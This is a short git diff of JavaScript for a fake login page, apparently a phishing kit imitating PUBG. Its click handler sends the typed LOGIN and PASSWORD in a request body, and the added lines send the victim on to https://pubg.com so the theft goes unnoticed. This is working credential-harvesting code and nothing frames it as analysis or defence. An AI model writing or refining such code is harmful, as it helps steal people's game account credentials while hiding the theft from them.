@@ -31,9 +31,10 @@ button.addEventListener('click', (e) => {
             text: `\n\n LOGIN: ${inputs[0].value} \n PASSWORD: ${inputs[1].value}`
         })
 
+    }).then((info) => info.json())
+    .then((malumot) => {
+      console.log(malumot);
+      window.location.href = "https://pubg.com"
     })
-        .then(info => info.json())
-        .then(malumot => { console.log(malumot) })
-        .catch(error => console.log("ERROR", error))
-
-})
+    .catch((error) => console.log("ERROR", error));
+});
